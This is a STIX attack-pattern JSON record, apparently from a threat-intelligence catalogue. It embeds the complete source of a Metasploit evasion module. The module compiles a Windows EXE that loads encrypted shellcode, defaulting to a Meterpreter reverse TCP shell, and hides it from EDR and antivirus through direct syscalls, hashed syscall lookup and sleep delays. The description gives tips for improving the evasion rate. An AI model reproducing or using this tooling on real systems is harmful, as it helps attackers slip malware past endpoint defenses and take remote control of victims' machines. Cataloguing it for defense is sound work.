{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d9c83854-3fa3-49cb-8289-17f16951415f",
    "created": "2024-08-14T16:33:19.193564Z",
    "modified": "2024-08-14T16:33:19.193567Z",
    "name": "Direct windows syscall evasion technique",
    "description": " This module allows you to generate a Windows EXE that evades Host-based security products such as EDR/AVs. It uses direct windows syscalls to achieve stealthiness, and avoid EDR hooking.  please try to use payloads that use a more secure transfer channel such as HTTPS or RC4 in order to avoid payload's network traffic getting caught by network defense mechanisms. NOTE: for better evasion ratio, use high SLEEP values ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/evasion/windows/syscall_inject.rb",
            "external_id": "syscall_inject.rb"
        }
    ],
    "x_code_snippet": "require 'metasploit/framework/compiler/mingw'\nrequire 'metasploit/framework/compiler/windows'\nclass MetasploitModule < Msf::Evasion\n  RC4 = File.join(Msf::Config.data_directory, 'headers', 'windows', 'rc4.h')\n  BASE64 = File.join(Msf::Config.data_directory, 'headers', 'windows', 'base64.h')\n  def initialize(info = {})\n    super(\n      merge_info(\n        info,\n        'Name' => 'Direct windows syscall evasion technique',\n        'Description' => %q{\n          This module allows you to generate a Windows EXE that evades Host-based security products\n          such as EDR/AVs. It uses direct windows syscalls to achieve stealthiness, and avoid EDR hooking.\n\n          please try to use payloads that use a more secure transfer channel such as HTTPS or RC4\n          in order to avoid payload's network traffic getting caught by network defense mechanisms.\n          NOTE: for better evasion ratio, use high SLEEP values\n        },\n        'Author' => [ 'Yaz (kensh1ro)' ],\n        'License' => MSF_LICENSE,\n        'Platform' => 'windows',\n        'Arch' => ARCH_X64,\n        'Dependencies' => [ Metasploit::Framework::Compiler::Mingw::X64 ],\n        'DefaultOptions' => {\n          'PAYLOAD' => 'windows/x64/meterpreter/reverse_tcp'\n        },\n        'Targets' => [['Microsoft Windows (x64)', {}]]\n      )\n      )\n    register_options(\n      [\n        OptEnum.new('CIPHER', [ true, 'Shellcode encryption type', 'chacha', ['chacha', 'rc4']]),\n        OptInt.new('SLEEP', [false, 'Sleep time in milliseconds before executing shellcode', 20000]),\n      ]\n    )\n\n    register_advanced_options(\n      [\n        OptEnum.new('OptLevel', [ false, 'The optimization level to compile with', 'Os', Metasploit::Framework::Compiler::Mingw::OPTIMIZATION_FLAGS ]),\n      ]\n    )\n  end\n\n  def calc_hash(name)\n    hash = @hash\n    ror8 = ->(v) { ((v >> 8) & 0xffffffff) | ((v << 24) & 0xffffffff) }\n    name.sub!('Nt', 'Zw')\n    name << \"\\x00\"\n    for x in (0..name.length - 2).map { |i| name[i..i + 1] if name[i..i + 1].length == 2 }\n      p_name = x.unpack('S')[0]\n      hash ^= p_name + ror8.call(hash)\n    end\n    hash.to_s(16)\n  end\n\n  def nt_alloc\n    %^\n    __asm__(\"NtAllocateVirtualMemory: \\\\n\\\\\n        mov [rsp +8], rcx          \\\\n\\\\\n        mov [rsp+16], rdx\\\\n\\\\\n        mov [rsp+24], r8\\\\n\\\\\n        mov [rsp+32], r9\\\\n\\\\\n        sub rsp, 0x28\\\\n\\\\\n        mov ecx, 0x#{calc_hash 'NtAllocateVirtualMemory'}        \\\\n\\\\\n        call GetSyscallNumber  \\\\n\\\\\n        add rsp, 0x28 \\\\n\\\\\n        mov rcx, [rsp +8]          \\\\n\\\\\n        mov rdx, [rsp+16] \\\\n\\\\\n        mov r8, [rsp+24] \\\\n\\\\\n        mov r9, [rsp+32] \\\\n\\\\\n        mov r10, rcx \\\\n\\\\\n        syscall                    \\\\n\\\\\n        ret \\\\n\\\\\n    \");\n    ^\n  end\n\n  def nt_close\n    %^\n    __asm__(\"NtClose: \\\\n\\\\\n        mov [rsp +8], rcx       \\\\n\\\\\n        mov [rsp+16], rdx \\\\n\\\\\n        mov [rsp+24], r8 \\\\n\\\\\n        mov [rsp+32], r9 \\\\n\\\\\n        sub rsp, 0x28 \\\\n\\\\\n        mov ecx, 0x#{calc_hash 'NtClose'}      \\\\n\\\\\n        call GetSyscallNumber  \\\\n\\\\\n        add rsp, 0x28 \\\\n\\\\\n        mov rcx, [rsp +8]          \\\\n\\\\\n        mov rdx, [rsp+16] \\\\n\\\\\n        mov r8, [rsp+24] \\\\n\\\\\n        mov r9, [rsp+32] \\\\n\\\\\n        mov r10, rcx \\\\n\\\\\n        syscall                    \\\\n\\\\\n        ret \\\\n\\\\\n    \");\n    ^\n  end\n\n  def nt_create_thread\n    %^\n    __asm__(\"NtCreateThreadEx: \\\\n\\\\\n        mov [rsp +8], rcx          \\\\n\\\\\n        mov [rsp+16], rdx\\\\n\\\\\n        mov [rsp+24], r8\\\\n\\\\\n        mov [rsp+32], r9\\\\n\\\\\n        sub rsp, 0x28\\\\n\\\\\n        mov ecx, 0x#{calc_hash 'NtCreateThreadEx'}        \\\\n\\\\\n        call GetSyscallNumber  \\\\n\\\\\n        add rsp, 0x28\\\\n\\\\\n        mov rcx, [rsp +8]          \\\\n\\\\\n        mov rdx, [rsp+16]\\\\n\\\\\n        mov r8, [rsp+24]\\\\n\\\\\n        mov r9, [rsp+32]\\\\n\\\\\n        mov r10, rcx\\\\n\\\\\n        syscall                    \\\\n\\\\\n        ret \\\\n\\\\\n    \");\n    ^\n  end\n\n  def nt_open_process\n    %^\n    __asm__(\"NtOpenProcess: \\\\n\\\\\n        mov [rsp +8], rcx           \\\\n\\\\\n        mov [rsp+16], rdx \\\\n\\\\\n        mov [rsp+24], r8 \\\\n\\\\\n        mov [rsp+32], r9 \\\\n\\\\\n        sub rsp, 0x28 \\\\n\\\\\n        mov ecx, 0x#{calc_hash 'NtOpenProcess'}        \\\\n\\\\\n        call GetSyscallNumber  \\\\n\\\\\n        add rsp, 0x28 \\\\n\\\\\n        mov rcx, [rsp +8]         \\\\n\\\\\n        mov rdx, [rsp+16] \\\\n\\\\\n        mov r8, [rsp+24] \\\\n\\\\\n        mov r9, [rsp+32] \\\\n\\\\\n        mov r10, rcx \\\\n\\\\\n        syscall                    \\\\n\\\\\n        ret \\\\n\\\\\n    \");\n    ^\n  end\n\n  def nt_protect\n    %^\n    __asm__(\"NtProtectVirtualMemory: \\\\n\\\\\n    push rcx \\\\n\\\\\n    push rdx \\\\n\\\\\n    push r8 \\\\n\\\\\n    push r9 \\\\n\\\\\n    mov ecx, 0x#{calc_hash 'NtProtectVirtualMemory'} \\\\n\\\\\n    call GetSyscallNumber  \\\\n\\\\\n    pop r9  \\\\n\\\\\n    pop r8 \\\\n\\\\\n    pop rdx \\\\n\\\\\n    pop rcx \\\\n\\\\\n    mov r10, rcx \\\\n\\\\\n    syscall           \\\\n\\\\\n    ret \\\\n\\\\\n    \");\n    ^\n  end\n\n  def nt_write\n    %^\n    __asm__(\"NtWriteVirtualMemory: \\\\n\\\\\n        mov [rsp +8], rcx          \\\\n\\\\\n        mov [rsp+16], rdx \\\\n\\\\\n        mov [rsp+24], r8 \\\\n\\\\\n        mov [rsp+32], r9 \\\\n\\\\\n        sub rsp, 0x28 \\\\n\\\\\n        mov ecx, 0x#{calc_hash 'NtWriteVirtualMemory'}        \\\\n\\\\\n        call GetSyscallNumber  \\\\n\\\\\n        add rsp, 0x28 \\\\n\\\\\n        mov rcx, [rsp +8]          \\\\n\\\\\n        mov rdx, [rsp+16] \\\\n\\\\\n        mov r8, [rsp+24] \\\\n\\\\\n        mov r9, [rsp+32] \\\\n\\\\\n        mov r10, rcx \\\\n\\\\\n        syscall                    \\\\n\\\\\n        ret \\\\n\\\\\n    \");\n    ^\n  end\n\n  def headers\n    @headers = \"#include <windows.h>\\n\"\n    @headers << \"#include \\\"#{BASE64}\\\"\\n\"\n    @headers << \"#include \\\"#{RC4}\\\"\\n\" if datastore['CIPHER'] == 'rc4'\n    @headers << \"#include \\\"chacha.h\\\"\\n\" if datastore['CIPHER'] == 'chacha'\n    @headers\n  end\n\n  def defines\n    %^\n        #define _SEED 0x#{@hash.to_s(16)}\n        #define _ROR8(v) (v >> 8 | v << 24)\n        #define MAX_SYSCALLS 500\n        #define _RVA2VA(Type, DllBase, Rva) (Type)((ULONG_PTR) DllBase + Rva)\n\n\n        typedef struct _SYSCALL_ENTRY\n        {\n            DWORD Hash;\n            DWORD Address;\n        } SYSCALL_ENTRY, *P_SYSCALL_ENTRY;\n\n        typedef struct _SYSCALL_LIST\n        {\n            DWORD Count;\n            SYSCALL_ENTRY Entries[MAX_SYSCALLS];\n        } SYSCALL_LIST, *P_SYSCALL_LIST;\n\n        typedef struct _PEB_LDR_DATA {\n            BYTE Reserved1[8];\n            PVOID Reserved2[3];\n            LIST_ENTRY InMemoryOrderModuleList;\n        } PEB_LDR_DATA, *P_PEB_LDR_DATA;\n\n        typedef struct _LDR_DATA_TABLE_ENTRY {\n            PVOID Reserved1[2];\n            LIST_ENTRY InMemoryOrderLinks;\n            PVOID Reserved2[2];\n            PVOID DllBase;\n        } LDR_DATA_TABLE_ENTRY, *P_LDR_DATA_TABLE_ENTRY;\n\n        typedef struct _PEB {\n            BYTE Reserved1[2];\n            BYTE BeingDebugged;\n            BYTE Reserved2[1];\n            PVOID Reserved3[2];\n            P_PEB_LDR_DATA Ldr;\n        } PEB, *P_PEB;\n\n        typedef struct _PS_ATTRIBUTE\n        {\n            ULONG  Attribute;\n            SIZE_T Size;\n            union\n            {\n                ULONG Value;\n                PVOID ValuePtr;\n            } u1;\n            PSIZE_T ReturnLength;\n        } PS_ATTRIBUTE, *PPS_ATTRIBUTE;\n\n        typedef struct _UNICODE_STRING\n        {\n            USHORT Length;\n            USHORT MaximumLength;\n            PWSTR  Buffer;\n        } UNICODE_STRING, *PUNICODE_STRING;\n\n        typedef struct _OBJECT_ATTRIBUTES\n        {\n            ULONG           Length;\n            HANDLE          RootDirectory;\n            PUNICODE_STRING ObjectName;\n            ULONG           Attributes;\n            PVOID           SecurityDescriptor;\n            PVOID           SecurityQualityOfService;\n        } OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;\n\n        typedef struct _CLIENT_ID\n        {\n            HANDLE UniqueProcess;\n            HANDLE UniqueThread;\n        } CLIENT_ID, *PCLIENT_ID;\n\n        typedef struct _PS_ATTRIBUTE_LIST\n        {\n            SIZE_T       TotalLength;\n            PS_ATTRIBUTE Attributes[1];\n        } PS_ATTRIBUTE_LIST, *PPS_ATTRIBUTE_LIST;\n\n        EXTERN_C NTSTATUS NtAllocateVirtualMemory(\n            IN HANDLE ProcessHandle,\n            IN OUT PVOID * BaseAddress,\n            IN ULONG ZeroBits,\n            IN OUT PSIZE_T RegionSize,\n            IN ULONG AllocationType,\n            IN ULONG Protect);\n\n        EXTERN_C NTSTATUS NtProtectVirtualMemory(\n            IN HANDLE ProcessHandle,\n            IN OUT PVOID * BaseAddress,\n            IN OUT PSIZE_T RegionSize,\n            IN ULONG NewProtect,\n            OUT PULONG OldProtect);\n\n        EXTERN_C NTSTATUS NtCreateThreadEx(\n            OUT PHANDLE ThreadHandle,\n            IN ACCESS_MASK DesiredAccess,\n            IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,\n            IN HANDLE ProcessHandle,\n            IN PVOID StartRoutine,\n            IN PVOID Argument OPTIONAL,\n            IN ULONG CreateFlags,\n            IN SIZE_T ZeroBits,\n            IN SIZE_T StackSize,\n            IN SIZE_T MaximumStackSize,\n            IN PPS_ATTRIBUTE_LIST AttributeList OPTIONAL);\n\n        EXTERN_C NTSTATUS NtWriteVirtualMemory(\n            IN HANDLE ProcessHandle,\n            IN PVOID BaseAddress,\n            IN PVOID Buffer,\n            IN SIZE_T NumberOfBytesToWrite,\n            OUT PSIZE_T NumberOfBytesWritten OPTIONAL);\n\n        EXTERN_C NTSTATUS NtOpenProcess(\n            OUT PHANDLE ProcessHandle,\n            IN ACCESS_MASK DesiredAccess,\n            IN POBJECT_ATTRIBUTES ObjectAttributes,\n            IN PCLIENT_ID ClientId OPTIONAL);\n\n        EXTERN_C NTSTATUS NtClose(\n            IN HANDLE Handle);\n        ^\n  end\n\n  def syscall_parser\n    %@\n    SYSCALL_LIST _SyscallList;\n\n    DWORD HashSyscall(PCSTR FunctionName)\n    {\n        DWORD i = 0;\n        DWORD Hash = _SEED;\n\n        while (FunctionName[i])\n        {\n            WORD PartialName = *(WORD*)((ULONG64)FunctionName + i++);\n            Hash ^= PartialName + _ROR8(Hash);\n        }\n\n        return Hash;\n    }\n\n    BOOL PopulateSyscallList()\n    {\n        // Return early if the list is already populated.\n        if (_SyscallList.Count) return TRUE;\n\n        P_PEB Peb = (P_PEB)__readgsqword(0x60);\n        P_PEB_LDR_DATA Ldr = Peb->Ldr;\n        PIMAGE_EXPORT_DIRECTORY ExportDirectory = NULL;\n        PVOID DllBase = NULL;\n\n        // Get the DllBase address of NTDLL.dll. NTDLL is not guaranteed to be the second\n        // in the list, so it's safer to loop through the full list and find it.\n        P_LDR_DATA_TABLE_ENTRY LdrEntry;\n        for (LdrEntry = (P_LDR_DATA_TABLE_ENTRY)Ldr->Reserved2[1]; LdrEntry->DllBase != NULL; LdrEntry = (P_LDR_DATA_TABLE_ENTRY)LdrEntry->Reserved1[0])\n        {\n            DllBase = LdrEntry->DllBase;\n            PIMAGE_DOS_HEADER DosHeader = (PIMAGE_DOS_HEADER)DllBase;\n            PIMAGE_NT_HEADERS NtHeaders = _RVA2VA(PIMAGE_NT_HEADERS, DllBase, DosHeader->e_lfanew);\n            PIMAGE_DATA_DIRECTORY DataDirectory = (PIMAGE_DATA_DIRECTORY)NtHeaders->OptionalHeader.DataDirectory;\n            DWORD VirtualAddress = DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;\n            if (VirtualAddress == 0) continue;\n\n            ExportDirectory = (PIMAGE_EXPORT_DIRECTORY)_RVA2VA(ULONG_PTR, DllBase, VirtualAddress);\n\n            // If this is NTDLL.dll, exit loop.\n            PCHAR DllName = _RVA2VA(PCHAR, DllBase, ExportDirectory->Name);\n\n            if ((*(ULONG*)DllName) != 'ldtn') continue;\n            if ((*(ULONG*)(DllName + 4)) == 'ld.l') break;\n        }\n\n        if (!ExportDirectory) return FALSE;\n\n        DWORD NumberOfNames = ExportDirectory->NumberOfNames;\n        PDWORD Functions = _RVA2VA(PDWORD, DllBase, ExportDirectory->AddressOfFunctions);\n        PDWORD Names = _RVA2VA(PDWORD, DllBase, ExportDirectory->AddressOfNames);\n        PWORD Ordinals = _RVA2VA(PWORD, DllBase, ExportDirectory->AddressOfNameOrdinals);\n\n        // Populate _SyscallList with unsorted Zw* entries.\n        DWORD i = 0;\n        P_SYSCALL_ENTRY Entries = _SyscallList.Entries;\n        do\n        {\n            PCHAR FunctionName = _RVA2VA(PCHAR, DllBase, Names[NumberOfNames - 1]);\n\n            // Is this a system call?\n            if (*(USHORT*)FunctionName == 'wZ')\n            {\n                Entries[i].Hash = HashSyscall(FunctionName);\n                Entries[i].Address = Functions[Ordinals[NumberOfNames - 1]];\n\n                i++;\n                if (i == MAX_SYSCALLS) break;\n            }\n        } while (--NumberOfNames);\n\n        // Save total number of system calls found.\n        _SyscallList.Count = i;\n\n        // Sort the list by address in ascending order.\n        for (DWORD i = 0; i < _SyscallList.Count - 1; i++)\n        {\n            for (DWORD j = 0; j < _SyscallList.Count - i - 1; j++)\n            {\n                if (Entries[j].Address > Entries[j + 1].Address)\n                {\n                    // Swap entries.\n                    SYSCALL_ENTRY TempEntry;\n\n                    TempEntry.Hash = Entries[j].Hash;\n                    TempEntry.Address = Entries[j].Address;\n\n                    Entries[j].Hash = Entries[j + 1].Hash;\n                    Entries[j].Address = Entries[j + 1].Address;\n\n                    Entries[j + 1].Hash = TempEntry.Hash;\n                    Entries[j + 1].Address = TempEntry.Address;\n                }\n            }\n        }\n\n        return TRUE;\n    }\n\n    extern DWORD GetSyscallNumber(DWORD FunctionHash)\n    {\n        if (!PopulateSyscallList()) return -1;\n        for (DWORD i = 0; i < _SyscallList.Count; i++)\n        {\n            if (FunctionHash == _SyscallList.Entries[i].Hash)\n            {\n                return i;\n            }\n        }\n        return -1;\n    }\n    @\n  end\n\n  def exec_func\n    %^\n        char* enc_shellcode = \"#{get_payload}\";\n        DWORD exec(void *buffer)\n        {\n            void (*function)();\n            function = (void (*)())buffer;\n            function();\n        }\n        ^\n  end\n\n  def inject\n    s = \"int i; for(i=0;i<10;i++){Sleep(#{datastore['SLEEP']} / 10);}\"\n    @inject = %@\n\n        void inject()\n        {\n            HANDLE pHandle;\n            DWORD old = 0;\n            CLIENT_ID cID = {0};\n            OBJECT_ATTRIBUTES OA = {0};\n            int b64len = strlen(enc_shellcode);\n            PBYTE shellcode = (PBYTE)malloc(b64len);\n            SIZE_T size = base64decode(shellcode, enc_shellcode, b64len);\n            PVOID bAddress = NULL;\n            int process_id = GetCurrentProcessId();\n            cID.UniqueProcess = process_id;\n            NtOpenProcess(&pHandle, PROCESS_ALL_ACCESS, &OA, &cID);\n            NtAllocateVirtualMemory(pHandle, &bAddress, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\n            int n = 0;\n            PBYTE temp = (PBYTE)malloc(size);\n            @\n    if datastore['CIPHER'] == 'rc4'\n      @inject << %@\n            #{Rex::Text.to_c key, Rex::Text::DefaultWrap, 'key'}\n            RC4(key, shellcode, temp, size);\n            NtWriteVirtualMemory(pHandle, bAddress, temp, size, NULL);\n            @\n    else\n      @inject << %@\n            #{Rex::Text.to_c key, Rex::Text::DefaultWrap, 'key'}\n            #{Rex::Text.to_c iv, Rex::Text::DefaultWrap, 'iv'}\n            chacha_ctx ctx;\n            chacha_keysetup(&ctx, key, 256, 96);\n            chacha_ivsetup(&ctx, iv);\n            chacha_encrypt_bytes(&ctx, shellcode, temp, size);\n            NtWriteVirtualMemory(pHandle, bAddress, temp, size, NULL);\n            @\n    end\n    @inject << %@\n            NtProtectVirtualMemory(pHandle, &bAddress, &size, PAGE_EXECUTE, &old);\n            #{s if datastore['SLEEP'] > 0};\n            HANDLE thread = NULL;\n            NtCreateThreadEx(&thread, THREAD_ALL_ACCESS, NULL, pHandle, exec, bAddress, NULL, NULL, NULL, NULL, NULL);\n            WaitForSingleObject(thread, INFINITE);\n            NtClose(thread);\n            NtClose(pHandle);\n        }\n        @\n  end\n\n  def main\n    %^\n        int main()\n        {\n            inject();\n        }\n        ^\n  end\n\n  def key\n    if datastore['CIPHER'] == 'rc4'\n      @key ||= Rex::Text.rand_text_alpha(32..64)\n    else\n      @key ||= Rex::Text.rand_text(32)\n    end\n  end\n\n  def iv\n    if datastore['CIPHER'] == 'chacha'\n      @iv ||= Rex::Text.rand_text(12)\n    end\n  end\n\n  def get_payload\n    junk = Rex::Text.rand_text(10..1024)\n    p = payload.encoded + junk\n    vprint_status(\"Payload size: #{p.size} = #{payload.encoded.size} + #{junk.size} (junk)\")\n    if datastore['CIPHER'] == 'chacha'\n      chacha = Rex::Crypto::Chacha20.new(key, iv)\n      p = chacha.chacha20_crypt(p)\n      Rex::Text.encode_base64 p\n    else\n      opts = { format: 'rc4', key: key }\n      Msf::Simple::Buffer.transform(p, 'base64', 'shellcode', opts)\n    end\n  end\n\n  def generate_code(src, opts = {})\n    comp_obj = Metasploit::Framework::Compiler::Mingw::X64.new(opts)\n    compiler_out = comp_obj.compile_c(src)\n    unless compiler_out.empty?\n      elog(compiler_out)\n      raise Metasploit::Framework::Compiler::Mingw::UncompilablePayloadError, 'Compilation error. Check the logs for further information.'\n    end\n    comp_file = \"#{opts[:f_name]}.exe\"\n    raise Metasploit::Framework::Compiler::Mingw::CompiledPayloadNotFoundError unless File.exist?(comp_file)\n\n    bin = File.binread(comp_file)\n    file_create(bin)\n    comp_obj.cleanup_files\n  end\n\n  def run\n    @hash = rand 2**28..2**32 - 1\n    comp_opts = '-masm=intel -w -mwindows '\n    src = headers\n    src << defines\n    src << nt_alloc\n    src << nt_close\n    src << nt_create_thread\n    src << nt_open_process\n    src << nt_protect\n    src << nt_write\n    src << syscall_parser\n    src << exec_func\n    src << inject\n    src << main\n    # obf_src =  Metasploit::Framework::Compiler::Windows.generate_random_c src\n    path = Tempfile.new('main').path\n    vprint_good \"Saving temporary source file in #{path}\"\n    compile_opts =\n      {\n        strip_symbols: true,\n        compile_options: comp_opts,\n        f_name: path,\n        opt_lvl: datastore['OptLevel']\n      }\n    generate_code src, compile_opts\n  end\n\nend\n",
    "x_mitre_platforms": [
        "windows'"
    ]
}